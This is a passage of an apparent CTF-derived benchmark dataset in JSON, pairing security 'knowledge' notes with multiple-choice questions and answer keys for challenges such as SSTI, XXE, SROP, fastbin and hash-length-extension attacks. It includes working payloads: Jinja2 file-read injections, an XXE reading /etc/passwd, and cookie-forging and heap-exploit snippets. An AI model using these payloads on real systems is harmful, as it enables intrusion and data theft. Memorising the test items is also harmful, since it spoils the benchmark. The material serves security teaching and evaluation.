            "When faced with a VM-based reverse engineering challenge, one effective approach is to decompile the VM instructions and reconstruct the logic of the program. This can be particularly useful when the program involves transformations based on stack operations, such as reversing the stack, translating binary representations to numeric values, or performing bitwise operations (e.g., XOR) on input values. By understanding these operations, one can reverse engineer the application's logic to deduce the required input (e.g., a flag).",
            "For challenges where a program breaks after each incorrect input character, simulating a timing attack can be beneficial. This can be accomplished by measuring the execution time or the number of function calls for each input character using tools like `valgrind --tool=callgrind`. The idea is to iteratively choose the input that results in the longest execution time or the highest number of function calls, indicating that more of the program code is being executed, and thus getting closer to the correct input. This method applies well to VM challenges or any challenge design that incrementally validates input.\n\n    Example usage: `valgrind --tool=callgrind ./chal input_character`\n    A script that automates this process could execute the target application with each possible input character and measure the call counts to determine which character progresses further in the validation process, thereby narrowing down the correct input one character at a time."
        ],
        "question": [
            "In a VM-based reverse engineering challenge, which of the following approaches is most effective when the program's logic involves translating binary representations to numeric values and performing bitwise operations like XOR on these values?  - A. Decompile the VM instructions and reconstruct the logic of the program by analyzing the stack operations. - B. Directly manipulate the binary executable file to insert the expected output and bypass the logic. - C. Use a high-level programming language to rewrite the entire challenge logic without understanding the original instructions. - D. Ignore the stack operations and focus solely on external APIs for performing bitwise operations. ",
            "For a reverse engineering challenge, where the program breaks after each incorrect character input, simulating which kind of attack can be beneficial to iteratively deduce the correct input?  - A. A brute-force attack using a standard dictionary of passwords. - B. A timing attack by measuring the execution time or the number of function calls for each input character. - C. A DDoS attack to exploit potential vulnerabilities in the handling of input validation. - D. A phishing attack to trick the system into revealing the correct input. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "void",
        "write_up": "dataset/raw/void.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2022",
            "https://ctftime.org/event/1557/tasks/"
        ],
        "score": 272,
        "max_score": 500,
        "difficulty": 0.544,
        "knowledge": [
            "When facing a scenario where direct writing to the `rax` register is not possible, and there's a need to control `rax` for syscall execution, using a `sys_read` call can be a practical workaround. By reading a specific amount of bytes, the value of `rax` can be indirectly set to the desired syscall number. For instance, to set `rax` to 0xf (`sys_rt_sigreturn` on x86_64), one could perform a read operation of 15 bytes. This technique is useful when constructing a syscall or SROP-based exploit where direct control over `rax` is necessary but not directly achievable. Example payload segment: `chain=p64(syscall_ret).ljust(constants.SYS_rt_sigreturn)`",
            "SROP (Sigreturn Oriented Programming) can be effectively used to bypass restrictions or limitations in exploit development, especially when gadget constraints make conventional ROP difficult. By manipulating the stack to include a `SigreturnFrame`, an attacker can control the state of the processor, including register values and the instruction pointer, upon executing a `sigreturn` syscall. This can be particularly useful for calling functions like `mprotect` to change memory permissions when needed, such as making a region executable for shellcode. Example technique: Construct a SigreturnFrame with desired register values (e.g., `frame.rax = constants.SYS_mprotect`, `frame.rdi = start_address`, `frame.rsi = length`, `frame.rdx = 7 (RWX permissions)`) and send it as part of the payload to execute `mprotect` via SROP."
        ],
        "question": [
            "In an exploit development scenario where you cannot directly write to the `rax` register to perform a desired syscall and you need to set `rax` to a specific value, which approach is valid for setting `rax` to the value corresponding to the `sys_rt_sigreturn` syscall (0xf) in x86_64 architecture? - A. Use a `jmp rax` instruction to indirectly set the value of `rax`. - B. Perform a `sys_write` operation of 15 bytes to indirectly set `rax` to 0xf. - C. Perform a `sys_read` operation of 15 bytes to indirectly set `rax` to 0xf. - D. Directly manipulate the `rax` register using an `add rax, 0xf` instruction.",
            "When leveraging Sigreturn Oriented Programming (SROP) to execute a syscall like `mprotect` for changing memory permissions in the context of exploit development, which is a correct use of a `SigreturnFrame` to prepare for the syscall invocation? - A. Set `frame.rax` to the opcode of `nop` instruction to execute `mprotect`. - B. Manipulate `frame.rdx` to the value of 4 to set the memory permissions to read-only. - C. Set `frame.rax` to `constants.SYS_mprotect`, and prepare `rdi`, `rsi`, and `rdx` with the address, length, and permissions (RWX) for `mprotect`. - D. Use a `SigreturnFrame` without modifying `frame.rip`, relying on default behavior to call `mprotect`."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "W",
        "write_up": "dataset/raw/W.md",
        "type": "reverse",
        "competition": [
            "0CTF/2020/Quals",
            "https://ctftime.org/event/1026/tasks/"
        ],
        "score": 523,
        "max_score": 846,
        "difficulty": 0.6182033096926713,
        "knowledge": [
            "When reversing WebAssembly (wasm) binaries, it is possible to decompile the binary using tools like ReWasm and JEB Pro for analysis. This process can reveal critical functions and the flow of program execution, useful for understanding underlying algorithms or uncovering vulnerabilities. Tools for decompilation enable renaming and clearer interpretation of function calls and logic structures.",
            "In scenarios involving known plaintext attacks against encoded or encrypted data within a binary, leveraging the presence of a specific plaintext string can facilitate the decryption or decoding process. By identifying and reverse-engineering the encoding or encryption routine (as demonstrated with the unpacking routine), one can retrieve the original input necessary to reproduce the expected decrypted output. Such an approach often involves crafting an inverse algorithm or using brute-force techniques to solve linear equations or other mathematical conditions imposed by the binary's logic.\n\nExample of crafting an inverse algorithm in Python for the unpacking routine:\n```python\ndef unpack(buf, buflen, secret):  \n   for i in range(0, buflen >> 9):  \n       a = 255  \n       for j in range(512):  \n           b = ord(secret[j & 0x1F]) ^ a ^ buf[i*512 + j]  \n           a = buf[i*512 + j]\n           buf[i*512 + j] = (b - (j & 0x1F)) & 0xFF\n   return buf\n```\n\nThis approach underscores the effectiveness of reverse engineering and cryptographic analysis in solving challenges that involve decoding or decrypting data within binaries, particularly in CTF contests and security research."
        ],
        "question": [
            "When analyzing a WebAssembly binary for reverse engineering, it is often necessary to decompile the binary to understand its functionality better. The following tools have been highlighted as useful in decompiling and analyzing WebAssembly binaries. Which of these tools is specifically mentioned for its ability to determine function names, aiding in clearer understanding during analysis? - A. Ghidra - B. IDA Pro - C. ReWasm - D. Binary Ninja ",
            "In a known plaintext attack scenario, especially when dealing with encoded or encrypted data, having a specific plaintext string and understanding the encryption or encoding logic is crucial. Given that the following Python function represents the reversed encryption or encoding logic applied to the data buffer and secret in a WebAssembly binary challenge, identify what primary operation is applied to each byte of the data buffer:  ```python def unpack(buf, buflen, secret): for i in range(0, buflen >> 9): a = 255 for j in range(512): b = ord(secret[j & 0x1F]) ^ a ^ buf[i*512 + j] a = buf[i*512 + j] buf[i*512 + j] = (b - (j & 0x1F)) & 0xFF return buf ```  - A. Each byte of the buffer is XORed with the secret and the result is rotated left by the index mod 32. - B. Each byte of the buffer is added to the corresponding byte of the secret, adjusted by its index. - C. Each byte of the buffer is XORed with the next character from the secret and the previous plaintext byte, then adjusted by the index mod 32. - D. Each byte of the buffer is multiplied by the corresponding byte of the secret, then rotated right by the position in the buffer. "
        ],
        "answer": [
            "C. ReWasm",
            "C. Each byte of the buffer is XORed with the next character from the secret and the previous plaintext byte, then adjusted by the index mod 32."
        ]
    },
    {
        "name": "wanky mail",
        "write_up": "dataset/raw/wanky mail.md",
        "type": "The type of this CTF challenge is a `web` challenge.",
        "competition": [
            "KITCTFCTF/2023",
            "https://ctftime.org/event/1965/tasks/"
        ],
        "score": 156,
        "max_score": 1000,
        "difficulty": 0.156,
        "knowledge": [
            "In Flask applications that utilize the `render_template_string` function, a server-side template injection (SSTI) vulnerability may occur if user input is included in the rendered templates without proper sanitation. This can lead to arbitrary code execution. To exploit such vulnerabilities, one can inject template syntax used by the server's templating engine (e.g., Jinja2 for Flask) into inputs that are rendered by the server. If the application attempts to escape user input by wrapping it in some sort of escaping function like `esc(s: str)` above, attackers can still break out of the escaping context using the templating engine's own syntax. A sample payload to list directories or read files if the application is vulnerable to this attack would look like this:  \nPayload to list files: `{% endraw %}{{ get_flashed_messages.__globals__.__builtins__.__import__('os').listdir() }}{% raw %}`  \nPayload to read file contents: `{% endraw %}{{ get_flashed_messages.__globals__.__builtins__.open(\"filename.txt\").read() }}{% raw %}`",
            "Proper email input and output handling in web applications is crucial to prevent XSS, SSRF, and information leaking through email functionalities. However, the use of a queue to manage active email addresses or sessions, as shown, introduces potential for denial of service or loss of email data if an attacker floods the service with email addresses, causing legitimate email data to be evicted from the queue. This highlights the need for comprehensive input validation, rate limiting, and consideration for data retention policies to safeguard against abuse. A preventive approach could include implementing captcha or other rate-limiting measures that prevent automated scripts from flooding the system with requests."
        ],
        "question": [
            "In the context of Flask web applications vulnerable to server-side template injection (SSTI), which of the following payloads would correctly demonstrate an exploit to read the contents of a file named \"example.txt\"?  - A. `{{ __import__('os').read('example.txt') }}` - B. `{{ file('example.txt').read() }}` - C. `{% endraw %}{{ get_flashed_messages.__globals__.__builtins__.open(\"example.txt\").read() }}{% raw %}` - D. `{{ open('example.txt').read() }}` ",
            "When developing web applications with email functionalities, which of the following measures is NOT effective in preventing denial of service attacks via email address flooding?  - A. Implementing CAPTCHA on email submission forms - B. Removing older email addresses and their data when a queue of active addresses becomes full - C. Utilizing a blacklist to filter out known malicious email addresses - D. Enforcing strict input validation on all incoming email content "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "warmup-rev",
        "write_up": "dataset/raw/warmup-rev.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 371,
        "max_score": 493,
        "difficulty": 0.7525354969574036,
        "knowledge": [
            "In challenges involving string manipulation functions, particularly when the functionality is described explicitly (e.g., character shifting or swapping), reversing the process can be achieved by inversing the operations. This method is applicable when functions modify string characters in a deterministic manner. \n   - For character shifting (e.g., adding a constant to character codes), reverse the operation by subtracting the same constant.\n   - For swapping parts of strings, reverse the process by correctly identifying the indices for re-swapping.\n   - Example reversal operation when \"+\" is used to manipulate characters: replace \"+\" with \"-\" to reverse the process.",
            "When the challenge involves multiple layers of encryption or manipulation functions, and analytical reversing is complex or impractical due to unknown variable values (e.g., indices after passing through functions), using a brute force approach to test all possible combinations can identify the correct sequence to reverse the manipulation.\n   - Particularly useful for reversing custom encryption or manipulation where part of the algorithm's specifics (like specific character positions) are not straightforward to deduce after transformations.\n   - Example approach for brute forcing indices in a reverse function: iterate over possible index ranges and apply the reversed operations, searching the outputs for recognizable patterns or the correct flag format."
        ],
        "question": [
            "In a string manipulation challenge, assume a function modifies each character of a string by adding a constant number to the character's ASCII value. To reverse this operation and retrieve the original string, which of the following operations would accurately describe the reversal process? - A. Multiply the ASCII value of each character by the same constant. - B. Subtract the same constant from the ASCII value of each character. - C. Add a different constant to the ASCII value of each character. - D. Divide the ASCII value of each character by the same constant.",
            "In a challenge where multiple encryption functions are applied to a string and direct analysis does not reveal the positions of certain characters after transformations, a method to determine the positions includes iterating over possible positions and reversing the transformations. If the approach involves reversing a function that depends on two unknown positions within the string, which technique is best suited to find the correct positions? - A. Adding a constant to the characters at guessed positions and checking if the output matches the expected result. - B. Only testing the first and last positions of the string for possible matches. - C. Iterating over all possible combinations of two positions within the string and applying the reversed transformations to see if any yield a recognizable pattern or the correct output. - D. Guessing the positions based on the length of the string and reversing the transformation without verification."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Wasm Notetaker",
        "write_up": "dataset/raw/Wasm Notetaker.md",
        "type": "pwn",
        "competition": [
            "BCACTF/2022",
            "https://ctftime.org/event/1602/tasks/"
        ],
        "score": 350,
        "max_score": 350,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving Use After Free (UAF) vulnerabilities in WebAssembly (Wasm) environments, particularly those utilizing the Emscripten compiler and dynamic memory allocation via malloc and free, exploit the vulnerability by first allocating a memory chunk, freeing it, and then manipulating the freed chunk to overwrite pointers or data. This method can be used to alter program execution flow or access restricted areas of memory. \n   - Sample exploitation steps: \n     1. Allocate a chunk of memory (`_malloc`). \n     2. Free the chunk (`_free`). \n     3. Overwrite the freed chunk's data or pointers to influence future allocations or program behavior.",
            "When exploiting Use After Free vulnerabilities, use arithmetic on pointers and data within the Wasm heap to position your payload such that it modifies specific target addresses or values. Especially in an environment like Wasm, where the memory layout can be deterministic, calculate the target address for your payload based on known offsets and structure sizes to achieve desired effects such as arbitrary write or code execution.\n   - Example technique to modify a specific address: After freeing a chunk, write into its place a pointer or value that will be used by the program to overwrite a targeted address or variable. Adjust the payload to accommodate for any alignment or offset requirements specific to the Wasm environment or memory management implementation."
        ],
        "question": [
            "In a WebAssembly (Wasm) challenge leveraging an Emscripten-compiled environment with a Use After Free (UAF) bug, which series of steps correctly exploits the UAF vulnerability for arbitrary memory manipulation? - A. Call malloc once, free it twice, then read from the allocated chunk. - B. Allocate a chunk, write data to it, then free the chunk without further modification. - C. Allocate a chunk of memory (`_malloc`), free that chunk (`_free`), then manipulate the now-freed chunk's data or pointers to influence future allocations or program behavior. - D. Continuously call malloc without freeing any chunks, leading to memory exhaustion and a crash. ",
            "When conducting a heap exploitation attack in a WebAssembly (Wasm) program that suffers from a Use After Free (UAF) vulnerability, how can the attacker manipulate the heap to modify a specific target address? - A. By adjusting the value of the global variable $g0 to directly point to the target address. - B. After freeing a chunk, write into its place a pointer or value that will be used by the program to overwrite a targeted address or variable, taking into account the heap's alignment and offset requirements. - C. Increase the heap's size using the emscripten `EM_ASM` API, then directly write to the target address. - D. Use the JavaScript `fetch` function to overwrite heap memory with data retrieved from a remote server. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "WawaCoin",
        "write_up": "dataset/raw/WawaCoin.md",
        "type": "crypto",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 400,
        "max_score": 600,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "When dealing with cookie security mechanisms that involve hashing (possibly including a secret key), and if the chosen hash algorithm is vulnerable to hash length extension attacks (e.g., SHA-1 or MD5), it's possible to forge a valid cookie by extending an existing known valid cookie value. This can be particularly useful in scenarios where the goal is to escalate privileges or impersonate another user. First, the length of the secret key needs to be determined, which can often be done by brute-forcing through different key lengths and observing the server's response to modified cookies. Tools like `hash_extender` can be employed for generating the new hash value after determining the correct key length.\n    - Example of determining key length and crafting payload (not directly executable due to dependencies on specific hash_extender tool and scenario setup):  \n    ```bash\n    #!/bin/bash\n    append=\";user=admin\" # Payload to append\n    key_length_guess=16  # Example guessed key length\n    known_data=\"user=demo\" # Known part of the cookie\n    known_signature=\"9183ff6055a46981f2f71cd36430ed3d9cbf6861\" # Known hash part of the cookie\n    tmp=$(./hash_extender -d=\"$known_data\" --signature=\"$known_signature\" --format=sha1 --append \"$append\" -l $key_length_guess | grep -v Type | grep -v Secret | cut -d\":\" -f 2 | tr \"\\n\" \"|\" | tr -d \" \" | sed 's/||//g')\n    modified_hash=$(echo $tmp | cut -d\"|\" -f 1) # Extracted new hash\n    modified_data=$(echo $tmp | cut -d\"|\" -f 2) # Extracted modified data\n    echo \"New cookie value: $modified_data|$modified_hash\"\n    ```",
            "User enumeration vulnerabilities can provide critical insights during an attack, informing attackers of valid usernames which can be further exploited in various attack vectors, such as crafted cookie/session manipulation or targeted password attacks. By observing different error messages returned by the server (e.g., \"Bad username\" vs. \"Bad password\"), an attacker can deduce the existence of specific usernames within the application. This information can enable focused attacks on specific accounts, especially high-value targets like admin accounts. In scenarios where an application reveals such information, it is advisable for attackers to keep a list of confirmed valid users for use in subsequent exploitation phases, such as the aforementioned cookie forging or direct authentication attacks.\n    - There is no direct payload example for user enumeration as it involves observation and interpretation of error messages returned from the server in response to authentication attempts."
        ],
        "question": [
            "In the context of a web application using SHA-1 for session cookie hash generation, which technique is best suited for forging a session cookie to elevate privileges without knowing the server's secret key? - A. Brute force the session cookie directly - B. Use a hash length extension attack to modify the session cookie - C. Decrypt the session cookie using SHA-1 reverse lookup tables - D. Intercept and reuse existing session cookies without modification",
            "During an attack on a web application, if attempting to login generates different error messages for \"Bad username\" and \"Bad password,\" which vulnerability is most likely being exposed? - A. Cross-site scripting (XSS) - B. Insecure Direct Object References (IDOR) - C. User enumeration - D. Cross-Site Request Forgery (CSRF)"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Weapon",
        "write_up": "dataset/raw/Weapon.md",
        "type": "pwn",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 219,
        "max_score": 952,
        "difficulty": 0.23004201680672268,
        "knowledge": [
            "In heap exploitation challenges where the goal is to perform a fastbin attack to gain shell or leak libc addresses, creating and freeing chunks in a specific order can manipulate the fastbin list to achieve arbitrary write or control over function pointers. This involves creating a fake chunk, freeing it to place it in the fastbin list, and then overwriting the metadata of another free chunk to control the fd pointer to point to a target memory location (such as `__malloc_hook`, `__free_hook`, or a GOT entry). \n   \n   Exploit steps for fastbin attack:\n   - Create several chunks of memory.\n   - Free some of them to populate the fastbin list.\n   - Craft a chunk with a specific size and content to overwrite another chunk's metadata or to manipulate the fastbin list.\n   - Free and reallocate chunks to control the allocation and placement of chunks in memory, allowing the execution of arbitrary code or memory leak.\n\n   Example payload snippet for manipulating fastbin list and creating fake chunk:\n   ```\n   add(0x60,2,p64(0x0)+p64(0x21)+'\\x00'*0x18+p64(0x21)*5)  # Creating fake chunk\n   free(2)  # Freeing to manipulate fastbin\n   add(0x60,0,'\\xdd\\x25')  # Manipulating fastbin list\n   ```",
            "Leveraging oversized input to trigger unexpected allocations in heap exploitation challenges can lead to controlled memory layouts or leaking libc addresses. When a program uses functions like `scanf` to read user input and allocates memory to store this input if the input size exceeds a certain threshold, an attacker can force the program to allocate a large chunk (e.g., 0x400) that might interfere with the existing heap layout, facilitating heap consolidation attacks or making libc addresses available for leakage through controlled content or structure overwrites.\n   \n   Exploit steps to trigger unexpected allocations and manipulate heap:\n   - Use program functionalities to create chunks in the heap.\n   - Trigger an unexpected allocation by inputting an oversized payload.\n   - Take advantage of the modified heap layout to create or edit chunks that either overwrite libc pointers or other sensitive data structures.\n\n   Example payload snippet for triggering unexpected allocation and subsequent exploitation:\n   ```\n   p.recvuntil(\">> \")  \n   p.sendline(\"1\"*0x1000)  # Triggering unexpected allocation by oversized input\n   create(3,0x60,\"\\xdd\\x25\")  # Creating controlled chunk after oversized allocation\n   ```"
        ],
        "question": [
            "In a scenario where exploiting a fastbin attack to achieve arbitrary write or control over function pointers in heap exploitation challenge, which of the following methods correctly manipulates the fastbin list to perform an arbitrary write? - A. Allocating multiple chunks of the same size and then freeing them in a random order. - B. Freeing a chunk twice and then creating a chunk to overwrite the freed chunk's metadata. - C. Creating a chunk with a specific size and content to directly overwrite the `__malloc_hook` without manipulating the fastbin list. - D. Creating chunks with increasing sizes to prevent any of them from being placed in the fastbin list.",
            "In the context of triggering unexpected allocations for heap exploitation via excessive input, what is the primary goal of inputting an oversized payload after creating and deleting several chunks? - A. To overflow a buffer and directly overwrite the return address on the stack. - B. To force the allocation of a large chunk that will not interfere with the existing heap layout or facilitate attacks. - C. To induce a program to allocate a large chunk that interferes with the existing heap layout, facilitating libc address leakage or heap consolidation attacks. - D. To crash the program by exhausting available memory, thereby revealing memory addresses in the error logs."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Webcome!",
        "write_up": "dataset/raw/Webcome!.md",
        "type": "web",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 314,
        "max_score": 953,
        "difficulty": 0.32948583420776495,
        "knowledge": [
            "To bypass script sanitization where certain characters or sequences are filtered, attackers can escape out of the initial context by ending the sequence prematurely with characters like `\\\\';` and then commenting out the rest of the line with `//` at the end to avoid syntax errors. This technique allows embedding malicious scripts or payloads within parameters that are inserted into the code or HTML. Example payload snippet: `\\\\';[payload]//`",
            "When dealing with CAPTCHA protected routes, one strategy is to solve the CAPTCHA externally and then use the obtained `g-recaptcha-response` to programmatically submit requests to the protected route. This method assumes the backend service lacks checks for origin or additional session validation tied to the CAPTCHA solving process, allowing an attacker to reuse a valid `g-recaptcha-response` in a crafted payload. This could be particularly effective when coupled with an XSS vulnerability or server-side request forgery (SSRF) to automate the process of obtaining sensitive information or triggering specific actions on the backend. Example payload step:\n   - Fetch `g-recaptcha-response` from an external source or service where CAPTCHA was solved.\n   - Create a POST request with the obtained `g-recaptcha-response` to the protected route.\n   - Extract sensitive information or flag from response and forward it to an attacker-controlled endpoint."
        ],
        "question": [
            "When attempting to bypass script sanitization that replaces certain risky strings in a JavaScript-based web application, what sequence of characters can be used to escape out of the sanitization context and inject a malicious payload? - A. Use `</script>` at the beginning and end of the payload - B. Start the payload with `%20` to encode spaces and circumvent filtering - C. Prefix the payload with `\\\\';` and suffix it with `//` to escape sanitization - D. Wrap the payload with HTML comment tags `<!--` and `-->` to hide it from processing ",
            "In a scenario where an attacker needs to bypass CAPTCHA protection on a web route, which approach would correctly describe a method for reusing a valid `g-recaptcha-response` acquired externally to submit a request to a protected endpoint? - A. Manually solve a CAPTCHA and input the solution directly into the website's form - B. Use a brute-force attack with random `g-recaptcha-response` values until a valid one is accepted - C. Solve the CAPTCHA on a different site and then use the `g-recaptcha-response` directly on the target form without modification - D. Fetch the `g-recaptcha-response` from an external source where the CAPTCHA was solved, then create a POST request with this response to the CAPTCHA-protected route "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "WebFugu",
        "write_up": "dataset/raw/WebFugu.md",
        "type": "web",
        "competition": [
            "SharkyCTF/2020",
            "https://ctftime.org/event/1034/tasks/"
        ],
        "score": 291,
        "max_score": 600,
        "difficulty": 0.485,
        "knowledge": [
            "When encountering encoded strings in web-based challenges, a two-step decoding process involving URL decoding followed by Base64 decoding can reveal hidden server-side template code or data structures. This knowledge is particularly useful in challenges where data is obfuscated or encoded to hide vulnerabilities or sensitive information.",
            "In scenarios dealing with server-side template injection vulnerabilities, specifically in web applications using the Thymeleaf template engine, injecting expressions to explore available variables (`${#vars.getVariableNames()}`) or invoking methods (`${flag.getContent()}`) can lead to the exposure of sensitive information or the execution of server-side code. This tactic can be applied to various template engines with similar syntax for variable access and method invocation. \n   \n   Example payload to list all variable names and their values:\n   ```\n   <div>  \n      <table border=\"1\">  \n         <tr th:each =\"var : ${#vars.getVariableNames()}\">  \n            <td th:utext=\"${var}\"></td>  \n            <td th:utext=\"${#vars.getVariable(var)}\"></td>  \n         </tr>  \n     </table>  \n   </div>\n   ```"
        ],
        "question": [
            "When debugging a web application and discovering template-based content that appears to be encoded, which initial decoding step should be applied before attempting a more common decoding technique like Base64? - A. UTF-8 Decoding - B. URL Decoding - C. Hexadecimal Decoding - D. ASCII Decoding",
            "In the context of exploiting server-side template injection vulnerabilities, especially with Thymeleaf, which payload strategy can be effective for revealing sensitive information through method invocation or variable exploration? - A. Injecting arbitrary JavaScript code for cross-site scripting. - B. Using SQL injection payloads to extract database information. - C. Utilizing template syntax to enumerate variable names and invoke methods. - D. Exploiting file inclusion vulnerabilities to include malicious files."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "web_Alex Fan Club API",
        "write_up": "dataset/raw/web_Alex Fan Club API.md",
        "type": "web",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a web challenge that involves inputting XML data, be mindful of XML External Entity (XXE) vulnerabilities. Specifically, if the application uses the `fromstring` function to parse XML without proper sanitization or security checks in place, it might be vulnerable to XXE attacks. This vulnerability can be exploited by crafting a malicious XML payload that defines an external entity containing data that you want the server to process, which can lead to unauthorized access to sensitive data.  \n   Example payload for XXE:  \n   ```\n   <?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><req><search>&xxe;</search></req>\n   ```",
            "If external network interactions are blocked (a common security measure to prevent certain types of XXE attacks), you can exploit the application logic to exfiltrate data. For instance, by using server feedback or error messages in response to crafted inputs, you can perform operations like a binary search to deduce or infer the value of sensitive data such as a flag. This approach is particularly useful in scenarios where direct data retrieval is not possible due to security restrictions.  \n   To apply this, you might insert specific inputs or commands within your XML payload that could cause the application to return a different response based on the processed data, thus allowing you to gradually narrow down to the correct value through feedback analysis or error messages.  \n   (A specific payload for this method cannot be provided without more context on the application's handling of XML input and the feedback it provides.)"
        ],
        "question": [
            "In an application that parses XML input using the `fromstring` function, which of the following payloads would likely exploit an XML External Entity (XXE) vulnerability to read sensitive files from the server? - A. `<?xml version=\"1.0\" ?><root><search>&xxe;</search></root>` - B. `<?xml version=\"1.0\" ?><req><search>regular_search</search></req>` - C. `<![CDATA[<search>non_vulnerable_search</search>]]>` - D. `<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><req><search>&xxe;</search></req>`",
            "When external network interactions are blocked and you cannot exfiltrate data directly, which technique can be employed to indirectly deduce sensitive information using server feedback or error messages? - A. Crafting payloads that cause the server to return verbose error messages containing sensitive data. - B. Performing a binary search algorithm by manipulating input data to receive differential feedback that allows inferring the value of the target data. - C. Increasing the verbosity of log output settings in the server configuration to get more detailed error messages. - D. Using automated scanners to identify vulnerabilities that may leak information through misconfigured server headers."
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "web_LIT BUGS",
        "write_up": "dataset/raw/web_LIT BUGS.md",
        "type": "web",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with web applications that utilize WebSockets for key functionalities such as user registration and login processes, analyzing the WebSocket event handlers in the source code can reveal potential vulnerabilities. Specifically, if the source code indicates predictable or enumerate-able unique identifiers (IDs) are tied to sensitive functionalities or data access, these can likely be brute-forced to bypass security measures or access restricted data.",
            "In scenarios where an application assigns random but enumerable IDs for user identification, and there's an exposed endpoint or functionality allowing data retrieval based on those IDs without proper rate limiting or authentication, a brute force attack can be effectively employed to enumerate all possible IDs and extract sensitive data. The knowledge of JavaScript and the ability to write scripts that interact with WebSockets can be particularly useful in automating the brute force process directly within the browser's console. \n\nExample Payload:\n```javascript\nsocket.on(\"reqNameRes\",(name)=>{  \n\tconsole.log(name)  \n});  \nfor(var i = 0; i < 1000; i++){  \n\tsocket.emit(\"reqName\", i)  \n}\n```"
        ],
        "question": [
            "In the context of implementing secure user authentication in a web application that leverages WebSockets, which of the following vulnerability could potentially be introduced if predictable or enumerable user IDs are utilized without additional security measures? - A. SQL Injection - B. Cross-Site Scripting (XSS) - C. Brute Force Attack - D. Man-in-the-Middle (MitM) Attack",
            "Given an application assigns random but easily enumerable IDs for user session management and provides a WebSocket-based functionality to retrieve user names based on these IDs with no rate limiting, which of the following best describes a technique that can exploit this design to access sensitive information? - A. Encrypting the WebSocket messages to protect the IDs from being exposed. - B. Using an automated script to sequentially request information for all possible IDs through the WebSocket connection. - C. Utilizing a phishing attack to trick users into revealing their IDs. - D. Implementing a Cross-Site Request Forgery (CSRF) attack to hijack user sessions."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "web_Secure Website",
        "write_up": "dataset/raw/web_Secure Website.md",
        "type": "web",
        "competition": [
            "LIT/2022",
            "https://ctftime.org/event/1694/tasks/"
        ],
        "score": -1.0,
        "max_score": 445,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving an RSA encryption and decryption mechanism on the client and server-side respectively, timing attacks can be facilitated by exploiting inefficient implementation of cryptographic functions such as `modPow`. This is applicable in scenarios where the cryptographic function takes significantly longer to process decryption of incorrect inputs compared to correct ones, leading to measurable time differences. A potential increase in response time indicates that the erroneous function call (e.g., decryptRSA) is being executed, signifying a correct password character. This knowledge is crucial for designing exploits that rely on differential timings to extract information bit by bit.",
            "To accurately execute a timing attack where the exact length of the secret or password is crucial but unknown, a progressively increasing input length method can be employed. By submitting inputs of varying lengths and measuring the server's response time, attackers can pinpoint the correct length when a notable change in response time is observed. This strategy is particularly effective in environments where early checks compare input length to secret length, and only inputs matching the secret length in terms of size proceed to more time-consuming operations (e.g., decryption operations in the RSA context provided). This approach allows for the circumvention of length checks and facilitates a more focused and efficient timing attack to deduce the password character by character.\n\nSample payload to find password length:\n```python\nimport requests, time\ndef find_length(url):\n    for i in range(1, 31):  # Assuming maximum password length to be 30\n        payload = url + \"verify?password=\" + (\"1234567890,\" * i)[:-1]\n        start_time = time.time()\n        requests.get(payload, allow_redirects=False)\n        elapsed_time = time.time() - start_time\n        print(f\"Length {i}: {elapsed_time} seconds\")\n```"
        ],
        "question": [
            "In the context of an RSA decryption function implemented on a server, why might an attacker measure the response time for different inputs to facilitate a timing attack?  - A. To identify whether the server uses multi-threading for its operations, which can make timing attacks more difficult. - B. To determine the efficiency of the server's hardware and optimize the DoS attack vectors. - C. To detect differences in execution time that may indicate whether a decryption operation was performed, thereby leaking information about the correctness of input. - D. To measure the bandwidth of the server's internet connection, indirectly affecting the response time. ",
            "When attempting to determine the secret length required by a server's verification mechanism through a timing attack, what strategy is employed using varying input lengths?  - A. Submitting increasingly larger files to overflow the server's temporary storage, hoping to cause a noticeable delay. - B. Submitting inputs of varying lengths and noting the change in response time, indicating when the input length matches the secret length and triggering more intensive processing. - C. Sending a constant stream of data to fill up the server's buffer and observing at what point the server starts to slow down due to processing overload. - D. Altering the packet size of network requests to find the optimal size that the server can process without encryption, minimizing latency. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "weenie_hut_general",
        "write_up": "dataset/raw/weenie_hut_general.md",
        "type": "reverse",
        "competition": [
            "b01lers/2021",
            "https://ctftime.org/event/1259/tasks/"
        ],
        "score": 218,
        "max_score": 500,
        "difficulty": 0.436,
        "knowledge": [
